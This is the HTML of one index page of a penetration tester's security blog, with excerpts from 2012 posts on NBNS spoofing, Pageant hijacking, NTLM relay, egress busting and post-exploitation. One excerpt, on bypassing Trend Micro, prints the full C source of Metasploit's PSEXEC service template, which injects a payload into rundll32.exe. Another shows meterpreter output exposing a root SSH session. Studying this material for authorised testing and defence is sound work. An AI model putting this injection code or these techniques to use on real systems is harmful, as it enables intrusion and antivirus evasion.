<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Home of mubix, the infosec treehugger">
  <meta name="generator" content="Hugo 0.15" />

  <title>Room362</title>

  
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
  <!--<![endif]-->

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="/css/side-menu.css">
  <!--<![endif]-->

  <link rel="stylesheet" href="/css/blackburn.css">

  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

  
  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">

  
  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />

  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>
  

  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />

</head>


<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  

  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </li>

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
    </li>
    

    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
    </li>
    

    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
    </li>
    

    

  </ul>
</div>

  <div class="pure-g">
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>&copy; 2016. All rights reserved.</small>
  </div>
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>Room362</h1>
  <h2>Blatherings of a security addict</h2>
</div>

<div class="content">
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-09-01-old-school-on-target-nbns-spoofing/">Old School On-target NBNS Spoofing</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>01 Sep 2012, 05:16</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  One of pen testers favorite attacks is NBNS spoofing. Now Wesley who I originally learned this attack from, traced this back to sid (http://www.notsosecure.com/folder2/2007/03/14/abusing-tcpip-name-resolution-in-windows-to-carry-out-phishing-attacks/) . Wesley&rsquo;s stuff can be found here: http://www.mcgrewsecurity.com/tools/nbnspoof/ Wesley&rsquo;s stuff eventually lead to this awesome post on the Packetstan blog: http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html and in that post the Metasploit module to do it all is demoed. But there in lies the rub. With each degree of separation we have more and more solidified in into a &ldquo;on-site&rdquo; only attack.
  </p>

  
  <footer>
    <a href="/post/2012/2012-09-01-old-school-on-target-nbns-spoofing/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-08-28-free-shells-with-plink-and-pageant/">Free Shells with Plink and Pageant</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>28 Aug 2012, 15:42</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with: meterpreter &gt; run enum_putty [*] Putty Installed for [[&quot;Administrator&quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &gt; Awesome, this guy runs as root and we have the IP address.
  </p>

  
  <footer>
    <a href="/post/2012/2012-08-28-free-shells-with-plink-and-pageant/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-08-25-post-exploitation-command-lists-request-to-edit/">Post Exploitation Command Lists - Request to Edit</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>25 Aug 2012, 01:56</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  The post exploitation command lists: Linux/Unix/BSD Post Exploitation: https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit Windows Post Exploitation: https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit OSX Post Exploitation: https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit and the newly added Obsucure Syststem&rsquo;s Post Exploitation: https://docs.google.com/document/d/1CIs6O1kMR-bXAT80U6Jficsqm0yR5dKUfUQgwiIKzgc/edit and Metasploit Post Exploitation: https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit Have been a weekly upkeep for me with so many… I don&rsquo;t know what to call it, &lsquo;undesirable edits&rsquo; to them. Bad copies, bad pastes, formatting issues and some times deletion or vandalism of the docs. Anyways, I have finally broken down and removed &lsquo;world&rsquo; editable permissions.
  </p>

  
  <footer>
    <a href="/post/2012/2012-08-25-post-exploitation-command-lists-request-to-edit/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-08-11-let-me-out-of-your-net-server-build/">LetMeOutOfYour.NET – Server Build</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>11 Aug 2012, 03:49</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  In the previous post: http://www.room362.com/blog/2012/8/11/let-me-out-of-your-net-workndashintro.html I told you about letmeoutofyour.net, but how does it work? Things we need to accomplish on the server: Listen on all ports Answer for all hostnames and subdomains Answer for all HTTP verbs, file and folder requests ONE: Listen on all ports (I used Linux, so this guide is for such, modifications to other OSs is up to the reader) First you have to get rid of all other services.
  </p>

  
  <footer>
    <a href="/post/2012/2012-08-11-let-me-out-of-your-net-server-build/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-08-10-let-me-out-of-your-net-intro/">LetMeOutOfYour.NET – Intro</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>10 Aug 2012, 03:22</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Something that is often useful is a known-good. Something out of the control of your adversary or outside modifiers. But back to that in a sec, egress ‘busting’ or getting your payload/backdoor/trojan/c2 out of someone’s network once you’ve gotten that ever elusive “CODE EXECUTION HAPPY DANCE” going on isn’t always easy. There is even a Metasploit payload for it called ‘allports’: https://community.rapid7.com/community/metasploit/blog/2009/09/24/forcing-payloads-through-restrictive-firewalls There is also ‘Egress Buster’ by the guys over at TrustedSec which can do 1000 ports in just a few seconds: https://www.trustedsec.com/july-2012/egress-buster-reverse-bypassav/ The problem I find with these tools is that they are still straight TCP.
  </p>

  
  <footer>
    <a href="/post/2012/2012-08-10-let-me-out-of-your-net-intro/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-08-07-free-ticket-contest-metasploit-mastery-at-derbycon/">Free Ticket Contest - Metasploit Mastery at DerbyCon</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>07 Aug 2012, 21:24</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Egypt and I have decided to give away a spot in our training event at DerbyCon. This won’t come easy though, you have to submit an essay to us with one of the following topics: Essay Topic Options: 1. Why I deserve a free training class 2. How I would social engineer Egypt and Mubix out of a ticket to their class Maximum Length: ~1000 words / 3 pages. (We&rsquo;re lazy) Submissions sent in direct email, PDF, or Doc(x) (extra points for zero day!) format to: derbyessay@room362.com The due date for a valid submission is 2359 GMT on August 15th, decisions will be made that weekend (August 18th &amp; 19th) and the winner will be announced (and emailed direction how to obtain class info) on the 20th.
  </p>

  
  <footer>
    <a href="/post/2012/2012-08-07-free-ticket-contest-metasploit-mastery-at-derbycon/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/">Raising Zombies in Windows: Part 1 - Passwords</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>31 Jul 2012, 20:20</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&rsquo;t really appreciative of our (pentester/red teamer)&rsquo;s schedule. A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &lsquo;runas.exe&rsquo;: w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&rsquo;re good right?
  </p>

  
  <footer>
    <a href="/post/2012/2012-07-31-raising-zombies-in-windows-part-1-passwords/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/">Cross-Protocol Chained Pass the Hash for Metasploit</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>10 Jul 2012, 06:02</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day: Twitter Link: https://twitter.com/webstersprodigy/status/222529916783169536 Which has a link to here: https://github.com/rapid7/metasploit-framework/pull/589 Demo / Example resource files: https://skydrive.live.com/?cid=19794fac33285fd5&amp;resid=19794FAC33285FD5!170&amp;id=19794FAC33285FD5%21170 You can pull the fork w/ branch from here: https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay And as soon as you do you can start doing this (using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded): 163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto.
  </p>

  
  <footer>
    <a href="/post/2012/2012-07-10-cross-protocol-chained-pass-the-hash-for-metasploit/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&#39;s Service Protection</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>05 Jul 2012, 03:44</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  @jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE 8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, &amp;ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) ); ZeroMemory( &amp;si, sizeof(STARTUPINFO) ); ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, &amp;ss ); if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, &amp;Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, &amp;Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st ); } It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;).
  </p>

  
  <footer>
    <a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="http://room362.com/post/2012/2012-06-29-presence-persistence-and-pivoting/">Presence, Persistence, and Pivoting</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>29 Jun 2012, 23:33</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best. The first P is Presence. It is first because the attacker needs to get a sense of what he/she has got before they move on.
  </p>

  
  <footer>
    <a href="/post/2012/2012-06-29-presence-persistence-and-pivoting/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  

  
<nav class="pagination" role="pagination">
  
  <a href="/page/7/"><i class="fa fa-angle-double-left"></i></a>
  
  <span>8 / 45</span>
  
  <a href="/page/9/"><i class="fa fa-angle-double-right"></i></a>
  
</nav>



</div>

</div>
</div>
<script src="http://room362.com/js/ui.js"></script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-198967-1', 'auto');
  ga('send', 'pageview');

</script>



</body>
</html>

